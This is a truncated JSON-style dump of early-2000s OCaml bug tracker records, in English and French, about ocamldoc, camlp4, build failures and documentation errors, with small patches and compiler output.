minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: john Skaller\nVersion: CVS\nOS: \nSubmission from: 203-213-127-159-syd-ts20-2600.tpgi.com.au (203.213.127.159)\n\n\nMany modules have no proper documentation, for example\nthe functions of the Set module are not documented.\n\nThis is probably a bug (SERIOUS!) in ocamldoc. Here is the\ncomplete page I see for the Set module:\n------------------------------------------\nPrevious  Up  Next\nModule Set\n\nmodule Set: sig  end\n\nSets over ordered types.\n\nThis module implements the set data structure, given a total ordering function\nover the set elements. All operations over sets are purely applicative (no\nside-effects). The implementation uses balanced binary trees, and is therefore\nreasonably efficient: insertion and membership take time logarithmic in the size\nof the set, for instance.\n\nmodule type OrderedType = sig  end\n\nInput signature of the functor Set.Make.\n\nmodule type S = sig  end\n\nOutput signature of the functor Set.Make.\n\nmodule Make: functor (Ord : OrderedType) -> sig  end\n\nFunctor building an implementation of the set structure given a totally ordered\ntype.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1866\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christian Skalka\nVersion: OCaml Windows interface 2.0\nOS: Windows\nSubmission from: 132.198.10.25 (132.198.10.25)\n\n\nIf I write a multi-line function with a match expression beginning on the \nfirst line in the Windows interface, copy-pasting a syntactically correct \nfunction causes a syntax error in the copy pasted version.  Here, for example,\nare two identical function definitions and the interpreter's response, the \nsecond definition having been copy-pasted from the first:\n\n# let f x = match x with \n    0 -> 0\n  | _ -> 1;;\nval f : int -> int = <fun>\n# let f x = match x with \n    0 -> 0\n  | _ -> 1;;\nCharacters 2-3:\n    | _ -> 1;;\n    ^\nSyntax error\n"},{"labels":["bug"],"text":"**Original bug ID:** 1865\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIl s'agit de la page qui decrit l'interface C et Caml dans la manuel de \nla version 3.07\nhttp://caml.inria.fr/ocaml/htmlman/manual032.html#htoc201\n\n-- \n*********************************************************************\n* Daniel Weil                                                       *\n* ATHYS                                                             *\n* NOVESPACE BÃ¢timent B - 100 allÃ©e St ExupÃ©ry - 38330 Montbonnot    *\n* Tel 33 (0)4 56 38 04 12 Fax 33 (0)4 56 38 04 01                   *\n* daniel.weil@athys.fr                                              *\n*********************************************************************\n"},{"labels":["bug"],"text":"**Original bug ID:** 1863\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nJ'ai un programme qui segfaulte quand il est compilÃ© avec ocamlc, et\npas ocamlopt. J'utilise toujours la beta 2.\n\nMalheureusement, je n'ai pas de version minimale.  Le programme est\ngros (c'est le compilateur CDuce), et en dichotomisant, je vois que la\nsegfault se produit au milieu d'une instruction dans une definition de\nmodules recursifs. D'ailleurs, c'est simplement l'acces Ã  un champ\nd'enregistrement qui est un entier qui provoque la segfaulte.\n\nJe suis quasiment sÃ»r de ne pas utiliser de magouilles avec Obj ou de\nmarshalling dans la trace d'execution qui plante.\n\nEst-ce qu'un bug corrigÃ© depuis la beta2 pourrait expliquer cela?\nSinon, j'essaierai quand meme de reduire le programme...\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1862\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFrom: artboreb@netscape.net (Arturo Borquez)\n\nHi,\nthis code fragment and the operations done gives me the\nproblem. Please try it, sorry but I haven't done more\ntests about it, but it seems me related to other posts\nearlier on this list. My opinion is that this transformations\nshould work as in 3.07+beta2\n\nPlease cut and paste the folowing:\n\n(*\n\nA round tour with camlp4 with \n\ngenerate ocaml syntax mli file, convert it to revised syntax & compile\n'a.ml (r_syntax -i option) -> 'ao.mli (o_syntax) -> 'a.mli (r_syntax) -> 'a.cmi\n\nocamlopt -pp camlp4r -i html.ml > htmlo.mli;\ncamlp4o pr_r.cmo -l 92 htmlo.mli > html.mli;\nocamlopt -pp camlp4r -c html.mli;\ncompiles ok in 3.07+beta2\nfeature or bug ???\n----------------------------------------------\n\n\nBUT with 3.07 the same yields\n\n[20:51:13 fethtml-1]: ocamlopt -pp camlp4r -i html.ml > htmlo.mli;\n[20:51:16 fethtml-1]: camlp4o pr_r.cmo -l 92 htmlo.mli > html.mli;\n[20:51:16 fethtml-1]: ocamlopt -pp camlp4r -c html.mli;\nFile \"html.mli\", line 8, characters 6-224:\nFailure: labelled type not allowed here\nPreprocessor error\n[20:51:16 fethtml-1]:\n*)\n\nmodule Html = struct\n\n  type me = [ Get | Post ];\n\n  value page ?(h1=[]) ?(h2=[]) ?(h4=[]) ?(track=\"\") ?(bgcolor=\"\")\n             ?(color=\"\") ?(hr=(0, \"\"))\n        tit act met d =\n    let ph l su pr c =\n      if l <> [] then do {\n        let s = ref \"\" in\n        List.iter (fun (x, p) -> s.val :=\n           s.val ^ (if p then \"<P>\" else \"\") ^ su ^\n           pr ^ (if p then \"</P>\" else \"\")) l; s.val ^ \"\\n\" }\n      else \"\" in\n    (\"<!DOCTYPE HTML PUBLIC \\\"-//W3C//DTD HTML 4.01//EN\\\">\\n\" ^\n       \"<HTML>\\n<HEAD>\" ^\n       \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/html; charset=UTF-8\\\">\\n\" ^\n       \"<TITLE>\" ^ tit ^ \"</TITLE>\\n</HEAD>\\n<BODY\" ^\n       (if bgcolor <> \"\" then \" BGCOLOR=\\\"\" ^ bgcolor ^ \"\\\"\"\n        else \"\") ^ \">\\n\" ^\n       (ph h1 \"<H1>\" \"</H1>\" color) ^\n       (ph h2 \"<H2>\" \"</H2>\" color) ^\n       (ph h4 \"<H4>\" \"</H4>\" color) ^\n       \"<FORM action=\\\"\" ^ act ^ \"\\\" method=\\\"\" ^ \n       (if met = Get then \"GET\" else \"POST\") ^ \"\\\">\\n\" ^\n       (if track <> \"\" then\n          \"<input type=\\\"hidden\\\" name=\\\"track\\\" value=\\\"\" ^ track ^ \"\\\">\\n\"\n        else \"\")) ^\n    d ^ \"</FORM>\\n</BODY>\\n\" ^ \n    (if fst hr > 0 then\n       \"<HR ALIGN=\\\"LEFT\\\" WIDTH=\\\"\" ^ (string_of_int (fst hr)) ^ \"%\\\">\"\n     else \"\") ^\n    (if snd hr <> \"\" then snd hr else \"\") ^ \"\\n</HTML>\\n\"\n  ;\n\nend;\n-----------------------------------------\n\nBest regards\n\n-- \nArturo Borquez\n"},{"labels":["bug"],"text":"**Original bug ID:** 1861\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Luc Habert\nVersion: 3.07\nOS: solaris 7\nSubmission from: drakkar.ens.fr (129.199.129.5)\n\n\n[This is not really a bug report, since the problem seems to be gcc's fault.\nI am just posting it here to let others know of the solution I have found.]\n\nOn a solaris 7 with a gcc 3.2.1 (it is the only such system I have\navailable, so that I cannot vouch for the innocence of my sysadmin), the\nbuild of ocaml 3.07 fails during the building of labltk. It happens that at\na time ocamlrun dlopens the previously built `dllstr.so', and crashes\nbecause that dll lacks a function `__eprintf'. This function is defined in\nthe static libgcc.a, but not in the dynamic `libgcc_s.so' that `dllstr.so'\ndepends on. I gather there is a problem in gcc with that respect.\n\nA solution is to force gcc to include the `__eprintf' defined in libgcc.a\ninto `ocamlrun', which can be achieved by passing a `-Wl,-u,__eprintf' to\nthe gcc that compiles ocamlrun (and then substituting this ocamlrun to\nboot/ocamlrun). Well, I have not deeply tested that str works after that,\nbut at least it lets the whole distribution compile.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1860\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nApparemment camlp4 a des problÃ¨mes avec certains labels :\n\n,----\n| $ cat a.ml\n| external a : bla:unit -> bli:unit -> unit = \"truc\"\n| $ ocamlc -v\n| The Objective Caml compiler, version 3.07\n| Standard library directory: /home/oliv/usr/lib/ocaml\n| $ ocamlc -c -i -pp camlp4o a.ml\n| File \"a.ml\", line 1, characters 28-29:\n| Parse error: '=' expected after [type] (in [str_item])\n| Preprocessor error\n`----\n\nAprÃ¨s un (trÃ©s rapide) coup d'oeuil au code j'ai changÃ© ceci et Ã§a\nremarche :\n\n--- camlp4/etc/pa_o.ml~ 2003-09-25 14:05:05.000000000 +0200\n+++ camlp4/etc/pa_o.ml  2003-09-30 03:40:04.000000000 +0200\n@@ -1149,7 +1149,7 @@\n   ;\n   (* Labels *)\n   ctyp: AFTER \"arrow\"\n-    [ NONA\n+    [ RIGHTA\n       [ i = lident_colon; t1 = ctyp LEVEL \"star\"; \"->\"; t2 = SELF ->\n           <:ctyp< ~ $i$ : $t1$ -> $t2$ >>\n       | i = OPTLABEL; t1 = ctyp LEVEL \"star\"; \"->\"; t2 = SELF ->\n\n-- \n   Olivier\n"},{"labels":["bug"],"text":"**Original bug ID:** 1859\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Yutaka Oiwa\nVersion: 3.07\nOS: Linux\nSubmission from: h219-110-065-001.catv01.itscom.jp (219.110.65.1)\n\n\nLabelled application is not correctly parsed in quotation.\n\n> #load \"q_MLast.cmo\"\n> let _ = <:expr<f ~x:y z>>\n\nproduces\n\n> File \"test.ml\", line 2, characters 17-19:\n> While expanding quotation \"expr\":\n> Parse error: end of input expected after [expression] (in [expression])\n\nAdding space before \":\" (i.e. <:expr<f ~x :y z>>) works,\nbut this is not in correct syntax outside quotation.\n\nThis bug did not appear in 3.07+beta1.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1857\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: John Skaller\nVersion: 3.07beta\nOS: na\nSubmission from: proxy3.tpgi.com.au (203.26.24.213)\n\n\nOcamllex documentation, minor detail only:\n\n12.2 says:\n\nrule entrypoint [arg1... argn] =\n\n(note the optional arguments .. )\n\nBut 12.2.5 just says:\n\n\nentrypoint lexbuf\n    (Where entrypoint is the name of another entry point in the same lexer\ndefinition.) Recursively call the lexer on the given entry point. Useful for\nlexing nested comments, for example.\n\nignoring the possibility of optional arguments.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1856\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Joshua D Guttman\nVersion: ocaml 3.07\nOS: Linux RHL 8\nSubmission from: webproxy2x.mitre.org (192.160.51.71)\n\n\nOn the page http://caml.inria.fr/ocaml/distrib-3.07.html, \nyou offer a version of the manual as \"one huge HTML page.\"  But in\nfact it's not all there:  individual portions of the library are\nmissing.  I checked the module Pervasives and some of the stdlib.  \n\nBut it should be useful if it's not totally massive by the time you\nadd these.  \n\nThanks --\n\n\tJoshua\n"},{"labels":["bug"],"text":"**Original bug ID:** 1853\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Mattias Waldau\nVersion: 3.07 from CVS 27/9\nOS: Mandrake 8.2\nSubmission from: c-1fdd71d5.09-253-7570701.cust.bredbandsbolaget.se (213.113.221.31)\n\n\nWanted to try the Show type at point functionality \nin emacs, but get the elisp-error \n\"Wrong type argument: number-or-marker-p\"\n\nThe caml-mode works well otherwise.I use emacs 21.1.1 built by Mandrake\n2002-03-03,\nnot xemacs.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1852\n**Reporter:** administrator\n**Status:** closed (set by @damiendoligez on 2007-12-12T14:54:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 3.11+dev\n**Category:** documentation\n\n## Bug description\n\nThe OCAML toplevel accepts\r\n\r\n   module X = struct 3 + 4 end;;\r\n\r\nbut the grammar at http://caml.inria.fr/ocaml/htmlman/manual019.html\r\nsays you can only have definitions inside struct...end, and bare\r\nexpressions aren't definitions.  I think you should add bare\r\nexpressions as definitions to the grammar.\r\n\r\n-- \r\nTim Freeman                                                  tim@fungible.com\r\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1851\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Prakash Countcham\nVersion: 3.06\nOS: Linux\nSubmission from: pc-atinf2.imag.fr (147.171.130.142)\n\n\nFeature wish :\n\nIs it possible to implement Watchpoints in ocamldebug (cf. gdb) ?\n\nThanks,\n\n Prakash Countcham\n"},{"labels":["bug"],"text":"**Original bug ID:** 1849\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\n  Le comportement par dÃ©faut des tags du module Format a changÃ© entre la\nversion 3.06 et la 3.07beta2: ils sont maintenant dÃ©sactivÃ©s par dÃ©faut.\nCe serait bien de le signaler dans le fichier Changes, puisque cela peut\ncasser des programmes existants (e.g. Flow Caml).\n\n  La doc n'est par ailleurs pas tout Ã  fait Ã  jour: le commentaire associÃ©\nÃ  Format.set_tags a Ã©tÃ© modifiÃ©, mais pas le paragraphe de l'introduction\nde la section \"Tags\" qui dit toujours:\n\n\tDefault behavior of the pretty printer engine is to consider tags as\n\tactive, so that output is decorated.\n\nAmicalement,\n\n--\nVincent\n"},{"labels":["bug"],"text":"**Original bug ID:** 1848\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nJ'essaie de pretty-printer le fichier suivant avec pr_o.cmo:\n\nbug.ml:\n=====================\nlet f = function\n  | X ->\n     \"hsfdjhfskjdhfksdhkfjshdkfhsdkjfhsdkjfhskjd \\\n            fhjdfshkhfsjkdhfksdhjfks\" ^\n            (u (match x with  _, _, (_, f) -> f))\n=====================\n\n\nDonc je fais:  ocamlc -c -pp 'camlp4o pr_o.cmo' bug.ml\nEt j'obtiens:\n\nInvalid argument: hprint_pretty\nPreprocessor error\n\nJe pense qu'il s'agit d'un bug dans pr_o.\n\nJ'ai essayÃ© de reduire le fichier, mais Ã§a semble assez minimal.\n\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1847\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Trevor Jim\nVersion: 3.07beta2\nOS: win xp + cygwin\nSubmission from: targe.cs.princeton.edu (128.112.139.194)\n\n\nI'm having trouble building 3.07beta2 on Windows XP under cygwin.\n\nOn make world opt install, the install fails on ocamldoc.  The cp command fails\nbecause it is invoked as cp ocamldoc ...  I changed the ocamldoc/Makefile to\nmake this cp ocamldoc.exe ... and this fixed the problem.  By the way, the same\nfailure occurs under 3.06.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1846\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nAprÃ¨s avoir telechargÃ© et installÃ© le package binaire OCaml 3.06 pour\nWin32 natif, la commande \"camlp4 -where\" me donne:\n\n  C:/ocaml/lib/camlp4\n\nalors que Ã§a devrait Ãªtre:\n\n  C:\\Program Files\\Objective Caml\\lib\\camlp4\n\nocamlc -where donne un rÃ©sultat correct, et OCAMLLIB a la bonne valeur.\n\nEst-ce un bug de la distribution?\n\n\n  Alain, qui commence Ã  utiliser des plate-formes exotiques\n"},{"labels":["bug"],"text":"**Original bug ID:** 1845\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: ValÃ©rie MÃ©nissier-Morain\nVersion: 3-07beta2\nOS: Linux/RedHat 7.2\nSubmission from: realarith.lip6.fr (132.227.66.34)\n\n\nLa fonction Str.group_beginning est documentÃ©e comme levant l'exception\nNot_found:\n\n  val group_beginning : int -> int\n\n  group_beginning n returns the position of the first character of the \n  substring that was matched by the nth group of the regular expression.\n  Raises Not_found if the nth group of the regular expression was not matched.\n\nAu cours d'une exÃ©cution, je vois apparaÃ®tre le message suivant:\n\n  Fatal error: exception Invalid_argument(\"Str.group_beginning\")\n\nalors que je rattrape effectivement l'exception Not_found.\n\nEst-ce un bug, un dÃ©faut de documentation ou bien ai-je compris quelque chose de\ntravers? \n\nValÃ©rie.\nP.S.: si on peut Ã©viter d'avoir besoin du code et de l'environnement\nd'exÃ©cution, vue la taille, ce serait bien!\n"},{"labels":["bug"],"text":"**Original bug ID:** 1844\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: ValÃ©rie MÃ©nissier-Morain\nVersion: 3-07beta2\nOS: Linux/RedHat 7.2\nSubmission from: realarith.lip6.fr (132.227.66.34)\n\n\nLa fonction Str.group_beginning est documentÃ©e comme levant l'exception\nNot_found:\n\n  val group_beginning : int -> int\n\n  group_beginning n returns the position of the first character of the \n  substring that was matched by the nth group of the regular expression.\n  Raises Not_found if the nth group of the regular expression was not matched.\n\nAu cours d'une exÃ©cution, je vois apparaÃ®tre le message suivant:\n\n  Fatal error: exception Invalid_argument(\"Str.group_beginning\")\n\nalors que je rattrape effectivement l'exception Not_found.\n\nEst-ce un bug, un dÃ©faut de documentation ou bien ai-je compris quelque chose de\ntravers? \n\nValÃ©rie.\nP.S.: si on peut Ã©viter d'avoir besoin du code et de l'environnement\nd'exÃ©cution, vue la taille, ce serait bien!\n"},{"labels":["bug"],"text":"**Original bug ID:** 1843\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Joshua Uyehara\nVersion: 3.06\nOS: RedHat GNU/Linux 8\nSubmission from: dialup-4.72.12.84.dial1.honolulu1.level3.net (4.72.12.84)\n\n\nTk API modification (added extra parameter to Tk_PhotoPutBlock) breaks labltk\ncompile.\n\nSimply add TK_PHOTO_COMPOSITE_OVERLAY as the last parameter to preserve the old\nbehavior.\n\ngrep finds calls in:\n\nlabltk/support/cltkImg.c\nlabltk/tkanim/tkAnimGIF.c\n"},{"labels":["bug"],"text":"**Original bug ID:** 1842\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Joshua Uyehara\nVersion: 3.06\nOS: RedHat GNU/Linux 8\nSubmission from: dialup-4.72.12.84.dial1.honolulu1.level3.net (4.72.12.84)\n\n\nTk API modification (added extra parameter to Tk_PhotoPutBlock) breaks labltk\ncompile.\n\nSimply add TK_PHOTO_COMPOSITE_OVERLAY as the last parameter to preserve the old\nbehavior.\n\ngrep finds calls in:\n\nlabltk/support/cltkImg.c\nlabltk/tkanim/tkAnimGIF.c\n"},{"labels":["bug"],"text":"**Original bug ID:** 1841\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nComment est-on censÃ© faire en Camlp4 pour ajouter des str_item qui ne\ncorrespondent Ã  rien dans le source?\n\nPar exemple, on peut faire Ã§a:\n\nlet () =\n  let old_parse_implem = !Pcaml.parse_implem in\n  let new_parse_implem s =\n    let (items,d) = old_parse_implem s in\n    let loc = (-1,-1) in\n    (<:str_item< declare $list:[]$ end >>, loc) :: items, d\n  in\n  Pcaml.parse_implem := new_parse_implem\n\nÃa marche quand on utilise pr_dump, mais pas avec pr_o. Par exemple sur\nun fichier x.ml qui est:\n\n--x.ml--\nlet x = 1\n----\n\nLa sortie est:\n----\n(* *)llet x = 1\n----\n\nIl y a un l en trop. En fait, c'est la premiere lettre du fichier qui est\nrecopiÃ©e partout oÃ¹ le pretty-printer veut afficher un str_item\npour lequel loc = (-1,-1). Soit c'est un bug de pr_o, soit il y une valeur\nde loc qui Ã©vite le probleme... J'ai essayÃ© avec (0,0), (0,-1), sans\nsuccÃ¨s.\n\nSi je rajoute un -sep \"\" comme argument Ã  pr_o, je contourne le problÃ¨me.\n\nÃ vue de nez, je dirais qu'il faut modifier dans pr_o le List.fold_left\nqui appelle copy_source (dans apply_printer), pour traiter le cas\nbp=ep=-1 Ã  part.\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1840\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Fernando Alegre\nVersion: 3.06 and 3.07beta2\nOS: Linux\nSubmission from: r49h230.res.gatech.edu (128.61.49.230)\n\n\nWe are puzzled by what we think is possibly a typechecker bug, as the only\ndifference between Tbool and Tfloat below is the specific type (either bool\nor float). The compiler should either fail or succeed in both cases, but it\nsucceeds in one and fails in the other...\n\nHere is the content of test.ml:\n\nmodule Test (A: sig type t end) (B: sig type x = {f:A.t} end) = struct end\n\nmodule Abool = struct type t = bool end\nmodule Bbool = struct type x = {f:bool} end\n\nmodule Afloat = struct type t = float end\nmodule Bfloat = struct type x = {f:float} end\n\nmodule Tbool  = Test(Abool) (Bbool)\nmodule Tfloat = Test(Afloat)(Bfloat)\n\n\nAnd here is the output (both in Ocaml-3.06 and 3.07beta2):\n\n$ ocamlc -c test.ml\nFile \"test.ml\", line 11, characters 29-35:\nSignature mismatch:\nModules do not match:\n  sig type x = Bfloat.x = { f : float; }  end\nis not included in\n  sig type x = { f : Afloat.t; }  end\nType declarations do not match:\n  type x = Bfloat.x = { f : float; }\nis not included in\n  type x = { f : Afloat.t; }\n"},{"labels":["bug"],"text":"**Original bug ID:** 1839\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nWhen the Xcaml runtime system is linked with the -linkall option of \nocamlc-3.06, the xcaml executable I get crashes with a segmentation \nfault at process initialization. If, on the other hand, I link the \nexecutable without the -linkall option, it runs fine, except for the \nfact that it lacks several library modules it should have.\n\nThe libraries I'm using are the following:\npostgres, which is know to work very well;\ncgi, which contains no C code;\nand str, num and dynlink coming straight from the ocaml distribution.\n\nMy code is definitely not a problem because it runs fine if the -linkall \noption is suppressed. Neither is the -linkall option a problem in and of \nitself, because I can reproduce the behaviour by issuing equivalent \nlinking commands using the cmo files as opposed the cmas.\n\nHow can I diagnose this segmentation fault? Under what circumstances \nexactly are ocaml programs \"allowed\" to crash with a segmentation fault?\n\nAlex\n"},{"labels":["bug"],"text":"**Original bug ID:** 1837\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\n[ Bug-report de basse prioritÃ© ]\n\nC'est carrÃ©ment stupide, mais il semble que le basename sur certains BSD\nessaie de reconnaitre des options de ligne de commande, et echoue sur Ã§a:\n\n# basename \"-o x.y\" y\nbasename: illegal option -- o\nusage: basename string [suffix]\n\nDu coup mkcamlp4 affiche un message d'erreur comme ci-dessus.\nCe n'est pas grave, il marche quand meme, mais bon.\n\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1832\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nProblÃ¨me avec 3.07+beta2 sur FreeBSD. La compilation de\nocamlc.opt (make world.opt) echoue:\n\n\nboot/ocamlrun ./ocamlopt -nostdlib -I stdlib  -ccopt \"-Wl,-E\" -o\nocamlc.opt  utils/misc.cmx utils/tbl.cmx utils/config.cmx\nutils/clflags.cmx utils/terminfo.cmx\nutils/ccomp.cmx utils/warnings.cmx utils/consistbl.cmx parsing/linenum.cmx\nparsing/location.cmx parsing/longident.cmx parsing/syntaxerr.cmx\nparsing/parser.cmx parsing/lexer.cmx parsing/parse.cmx\nparsing/printast.cmx typing/ident.cmx typing/path.cmx typing/primitive.cmx\ntyping/types.cmx typing/btype.cmx typing/oprint.cmx typing/subst.cmx\ntyping/predef.cmx typing/datarepr.cmx typing/env.cmx typing/typedtree.cmx\ntyping/ctype.cmx typing/printtyp.cmx typing/includeclass.cmx\ntyping/mtype.cmx typing/includecore.cmx typing/includemod.cmx\ntyping/parmatch.cmx typing/typetexp.cmx typing/stypes.cmx\ntyping/typecore.cmx typing/typedecl.cmx typing/typeclass.cmx\ntyping/typemod.cmx bytecomp/lambda.cmx bytecomp/printlambda.cmx\nbytecomp/typeopt.cmx bytecomp/switch.cmx bytecomp/matching.cmx\nbytecomp/translobj.cmx bytecomp/translcore.cmx bytecomp/translclass.cmx\nbytecomp/translmod.cmx bytecomp/simplif.cmx bytecomp/runtimedef.cmx\nbytecomp/meta.cmx bytecomp/instruct.cmx bytecomp/bytegen.cmx\nbytecomp/printinstr.cmx bytecomp/opcodes.cmx bytecomp/emitcode.cmx\nbytecomp/bytesections.cmx bytecomp/dll.cmx bytecomp/symtable.cmx\nbytecomp/bytelink.cmx bytecomp/bytelibrarian.cmx bytecomp/bytepackager.cmx\ndriver/pparse.cmx driver/errors.cmx driver/compile.cmx\ndriver/main_args.cmx driver/main.cmx  asmrun/meta.o asmrun/dynlink.o\n-cclib \"-lm  -lcurses -pthread\"\nstdlib/libasmrun.a(signals.o): In function `init_signals':\nsignals.o(.text+0x4f9): undefined reference to `sigaltstack'\nError during linking\n\nconfigure donne:\n  System stack overflow can be detected.\ncontrairement Ã  ocaml 3.06:\n  Cannot detect system stack overflow.\n\n\nVoici ce que donne uname -a:\nFreeBSD cedre 4.7-RELEASE FreeBSD 4.7-RELEASE #0: Wed Oct  9 15:08:34 GMT 2002\n   root@builder.freebsdmall.com:/usr/obj/usr/src/sys/GENERIC  i386\n\nDites-moi si vous avez besoin de plus d'infos.\n\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1831\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe current CVS win32caml/Makefile supports building under MinGW by way of\n\"ifeq ($(TOOLCHAIN),mingw)\" rules, but nothing is built because the\ntop-level Makefile.nt was not updated similarly. For example, see\nfollowing patch.\n\nThanks and best regards,\nTony Ambardar\n\n\n\n--- ocaml/Makefile.nt.orig\tFri Aug 29 05:14:24 2003\n+++ ocaml/Makefile.nt\tFri Sep 12 22:29:13 2003\n@@ -229,6 +229,9 @@\n ifeq ($(TOOLCHAIN),msvc)\n \tcd win32caml ; $(MAKE) install\n endif\n+ifeq ($(TOOLCHAIN),mingw)\n+\tcd win32caml ; $(MAKE) install\n+endif\n \tcd camlp4 ; make install\n \tcp README $(DISTRIB)/Readme.gen\n \tcp README.win32 $(DISTRIB)/Readme.win\n@@ -587,6 +590,9 @@\n\n win32gui:\n ifeq ($(TOOLCHAIN),msvc)\n+\tcd win32caml ; $(MAKE) all\n+endif\n+ifeq ($(TOOLCHAIN),mingw)\n \tcd win32caml ; $(MAKE) all\n endif\n clean::\n"},{"labels":["bug"],"text":"**Original bug ID:** 1830\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Wheeler Ruml\nVersion: 3.07b2\nOS: html\nSubmission from: katsura.parc.xerox.com (13.2.18.21)\n\n\nThe documentation for Unix.umask says \"process creation mask\".  I think it might\nintend to say \"file permissions creation mask\"?\n\nThanks,\n\nWheeler\n"},{"labels":["bug"],"text":"**Original bug ID:** 1827\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello again,\n\nDans mon prÃ©cÃ©dent rapport de bug (sur le type cyclique), j'ai oubliÃ© de\nsignaler que le message d'erreur ne donne pas le numero de ligne quand on\nutilise camlp4o comme parseur:\n\nlocalhost ~/cduce $ ocamlc -c -pp camlp4o bug.ml\nFile \"bug.ml\", line 1, characters 207-213:\nThe type abbreviation t is cyclic\n\nlocalhost ~/cduce $ ocamlc -c bug.ml\nFile \"bug.ml\", line 4, characters 4-15:\nThe type abbreviation t is 